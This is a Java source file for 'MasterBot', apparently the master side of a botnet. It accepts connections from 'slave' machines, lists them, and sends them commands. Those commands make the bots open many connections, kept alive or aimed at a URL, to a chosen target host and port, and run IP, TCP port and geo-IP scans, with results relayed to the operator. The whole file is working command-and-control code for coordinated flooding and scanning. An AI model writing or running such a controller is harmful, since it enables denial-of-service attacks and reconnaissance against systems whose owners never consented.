import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.*;
import java.text.*;

class Conn{
String 	Date;
String 	Host;
String 	Name;
int	Port;
Socket 	Sock;
  Conn() {
	Date date = new Date();
	SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
	String format = formatter.format(date);
	Date=format;
  }
}

public class MasterBot {
  public static volatile String Command;
  public static ArrayList<Conn> List;
  public static void main(String[] args) throws Exception {
      List = new ArrayList<Conn>();
	if (args.length<2){
	  System.err.println("Error in the arguments ");
	 System.exit(-1);	
	}
	    try {
	String port="";
        if (args[0].equals("-p")){	
      		port=args[1];
	}
	else{
	System.err.println("Error in the arguments ");
	System.exit(-1);
	}
      SocketThread clientThread = new SocketThread(Integer.parseInt(port));
      clientThread.start();   
	while(true){
		System.out.print(">");
		 BufferedReader Input = new BufferedReader(new InputStreamReader(System.in));
		 Command= Input.readLine();

		      if (Command !="" && ! Command.equals("list") ) {
 			String[] serverCommand = Command.split(" ");
			boolean keepAlive = false;
				String url = "";
					if(serverCommand[0].equals("connect")){
						if(serverCommand.length<4) {
							System.out.println("minimum 3 arguments are required");
						}
						else{
						if(serverCommand[1] != null && serverCommand[2]!= null && serverCommand[3]!= null){    	
							int numberConn;
							if(serverCommand.length>4){
								numberConn= Integer.parseInt(serverCommand[4]);
							}
							else
								numberConn=1;
							Iterator<Conn> i = List.iterator();
							int argument2;
							
							if (serverCommand[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								argument2=1;
							}
							else if(serverCommand[1].equals("all") ){
								argument2=3; 
								}
							else {
								argument2=2;
								}

							switch (argument2) {
							    case 1:  
								while (i.hasNext()) {
								   	Conn currentSock = i.next(); 
									if(currentSock.Host.equals(serverCommand[1])){
									try{
									 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
									
									 if(serverCommand.length>5){
										 if(serverCommand[5].equalsIgnoreCase("keepalive")){
													keepAlive = true;
													netOut.println( "connect "+serverCommand[2]+" "+serverCommand[3]+" "+numberConn+" "+keepAlive);
												}
												else if (serverCommand[5].matches("^url=[^ ]+$")) {
												url = serverCommand[5].substring(4);
												netOut.println( "connect "+serverCommand[2]+" "+serverCommand[3]+" "+numberConn+" "+ "url=" + url);
											}
									 }
									else{
										netOut.println("connect "+ serverCommand[2] + " "+ serverCommand[3] + " "+numberConn);
									 }
									 
  									netOut.flush();
									}
									 catch (Exception e) {
									System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
									}
									}
									}
								     break;
							    case 2:  
								while (i.hasNext()) {
								   	Conn currentSock = i.next(); 
									if(currentSock.Name.equals(serverCommand[1])){
									try{
									 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
									netOut.println("connect "+ serverCommand[2] + " "+ serverCommand[3] + " "+numberConn);
  									netOut.flush();
									}
									 catch (Exception e) {
									System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
									}
									}
									}
								     break;
							    case 3: 
								while (i.hasNext()) {
							   	Conn currentSock = i.next();
									try{
									 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
									netOut.println("connect "+ serverCommand[2] + " "+ serverCommand[3] + " "+numberConn);
  									netOut.flush();
									}
									 catch (Exception e) {
									System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
									}	
									}
								     break;
							}


			
						}
						else{
							System.out.println(" illegal arguments for connect");
						}
					}
					}
					else if(serverCommand[0].equals("ipscan")){

						if(serverCommand.length<3) {
							System.out.println("minimum 2 arguments are required");
						}
						else{
						if(serverCommand[1] != null && serverCommand[2]!= null){    	
							

							Iterator<Conn> i = List.iterator();
							int argument2;
							
							if (serverCommand[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								argument2=1; }
							else if(serverCommand[1].equals("all") ) {
								argument2=3;
								}
							else {
								argument2=2;
								}
							Conn currentSock = null;
							switch (argument2) {
							    case 1:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Host.equals(serverCommand[1])){
										OperationThread ipscan = new OperationThread(1,currentSock.Sock,"ipscan "+ serverCommand[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
									}
								     break;
							    case 2:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Name.equals(serverCommand[1])){
										
										OperationThread ipscan = new OperationThread(2,currentSock.Sock,"ipscan "+ serverCommand[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									
									}
									}
								     break;
							    case 3: 
								while (i.hasNext()) {
							   	 currentSock = i.next();
							   	 
									OperationThread ipscan = new OperationThread(3,currentSock.Sock,"ipscan "+ serverCommand[2]);
									Thread t1=new Thread(ipscan);
									t1.start();
									
									}
								     break;
							}

			
						}
						else{
							System.out.println(" illegal arguments for ipscan");
						}
						}	
					}
					else if(serverCommand[0].equals("tcpportscan")){

						if(serverCommand.length<4) {
							System.out.println("minimum 2 arguments are required for tcppportscan");
						}
						else{
						if(serverCommand[1] != null && serverCommand[2]!= null&& serverCommand[3]!= null){    	
							

							Iterator<Conn> i = List.iterator();
							int argument2;
							
							if (serverCommand[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								argument2=1; }
							else if(serverCommand[1].equals("all") ) {	argument2=3; }
							else {	argument2=2;}
							Conn currentSock = null;
							switch (argument2) {
							    case 1:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Host.equals(serverCommand[1])){
										OperationThread ipscan = new OperationThread(4,currentSock.Sock,"tcpportscan "+ serverCommand[2]+" "+serverCommand[3]);
										Thread t1=new Thread(ipscan);
										t1.start();

									}
									}
								     break;
							    case 2:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Name.equals(serverCommand[1])){
										OperationThread ipscan = new OperationThread(4,currentSock.Sock,"tcpportscan "+ serverCommand[2]+" "+serverCommand[3]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
									}
								     break;
							    case 3: 
								while (i.hasNext()) {
							   	 currentSock = i.next();
									OperationThread ipscan = new OperationThread(4,currentSock.Sock,"tcpportscan "+ serverCommand[2]+" "+serverCommand[3]);
									Thread t1=new Thread(ipscan);
									t1.start();
	
									}
								     break;
							}

			
						}
						else{
							System.out.println(" illegal arguments for tcpportscan");
						}
						}	
					}
					
					
					else if(serverCommand[0].equals("geoipscan")){

						if(serverCommand.length<3) {
							System.out.println("minimum 2 arguments are required for geoipscan");
						}
						else{
						if(serverCommand[1] != null && serverCommand[2]!= null){    	
							

							Iterator<Conn> i = List.iterator();
							int argument2;
							
							if (serverCommand[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								argument2=1; }
							else if(serverCommand[1].equals("all") ) {	argument2=3; }
							else {	argument2=2;}
							Conn currentSock = null;
							switch (argument2) {
							    case 1:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Host.equals(serverCommand[1])){
										OperationThread ipscan = new OperationThread(5,currentSock.Sock,"geoipscan "+ serverCommand[2]);
										Thread t1=new Thread(ipscan);
										t1.start();

									}
									}
								     break;
							    case 2:  
								while (i.hasNext()) {
								   	 currentSock = i.next(); 
									if(currentSock.Name.equals(serverCommand[1])){
										OperationThread ipscan = new OperationThread(6,currentSock.Sock,"geoipscan "+ serverCommand[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
									}
								     break;
							    case 3: 
								while (i.hasNext()) {
							   	 currentSock = i.next();
									OperationThread ipscan = new OperationThread(7,currentSock.Sock,"geoipscan "+ serverCommand[2]);
									Thread t1=new Thread(ipscan);
									t1.start();
	
									}
								     break;
							}

			
						}
						else{
							System.out.println(" illegal arguments for geoipscan");
						}
						}	
					}
					else if(serverCommand[0].equals("disconnect")){
						if(serverCommand.length<3) {
						System.out.println(" minimum 2 arguments are required");
					}
					else{
					if(serverCommand[1] != null && serverCommand[2]!= null){    	
						int disConnPort=0;
						if(serverCommand.length>3){
							disConnPort= Integer.parseInt(serverCommand[3]);
						}

						Iterator<Conn> i = List.iterator();
						int argument2;
						
						if (serverCommand[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
							argument2=1; }
						else if(serverCommand[1].equals("all") ) {
							argument2=3;
							}
						else {
							argument2=2;
							}

						switch (argument2) {
						    case 1:  
							while (i.hasNext()) {
							   	Conn currentSock = i.next(); 
								if(currentSock.Host.equals(serverCommand[1])){
								try{
								 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
								netOut.println("disconnect "+ serverCommand[2] + " "+ disConnPort);
									netOut.flush();
								}
								 catch (Exception e) {
								System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
								}
								}
								}
							     break;
						    case 2:  
							while (i.hasNext()) {
							   	Conn currentSock = i.next(); 
								if(currentSock.Name.equals(serverCommand[1])){
								try{
								 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
								netOut.println("disconnect "+ serverCommand[2] + " "+ disConnPort);
									netOut.flush();
								}
								 catch (Exception e) {
								System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
								}
								}
								}
							     break;
						    case 3: 
							while (i.hasNext()) {
						   	Conn currentSock = i.next();
								try{
								 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSock.Sock.getOutputStream()));
								netOut.println("disconnect "+ serverCommand[2] + " "+ disConnPort);
									netOut.flush();
								}
								 catch (Exception e) {
								System.err.println("Error connecting with "+ currentSock.Host+" " + currentSock.Port);
								}	
								}
							     break;
						}


		
					}
					else{
						System.out.println(" illegal arguments for disconnect");
					}
					}	
						
					}

			}
		 if(Command.equals("list")){

					for(int i=0;i<List.size(); i++){
		  					System.out.println(List.get(i).Name+" "+List.get(i).Host + " "+ List.get(i).Port + " "+ List.get(i).Date);

					}
			}
		 

	    } 
		}

		catch (Exception e) {
	      	e.printStackTrace();
		System.exit(-1);	    
}

  }
	
}


class SocketThread extends Thread {
  int portNumber;
  Conn sockList;
  
  //constructor
  SocketThread(int port) {
    portNumber = port;
  }
  
  public void run() {
	    try {
		   ServerSocket serverSocket = new ServerSocket(portNumber);
		    while (true) {
			      Socket clientSocket = serverSocket.accept();
				    sockList=new Conn();
				    sockList.Host=clientSocket.getInetAddress().getHostAddress();
				    sockList.Name=clientSocket.getInetAddress().getHostName();
				    sockList.Port=clientSocket.getPort();
				    sockList.Sock=clientSocket;
				    MasterBot.List.add(sockList);
		    }
	    } catch (Exception e) {
	      e.printStackTrace();
	    }
  }
}



class OperationThread extends Thread{
	int Type=0;
	Socket currentSocket=null;
	String message="";
	
	OperationThread(int opr,Socket s, String m){
		Type=opr;
		currentSocket = s;
		message=m;
	}
	
	public void run(){
		try{
			 PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.getOutputStream()));
			netOut.println(message);
				netOut.flush();
			}
			 catch (Exception e) {
			System.err.println("Error connecting to slave ");
			}
		
		 BufferedReader Input;
		try {
			Input = new BufferedReader(new InputStreamReader(currentSocket.getInputStream()));
		    String Line ="";
            while((Line=Input.readLine())!=null)
		      System.out.println(Line);
            
            
		} catch (IOException e) {
			
			System.err.println("Unable to recieve data from slave ");
		}
		System.out.print(">");
		
	}
	
}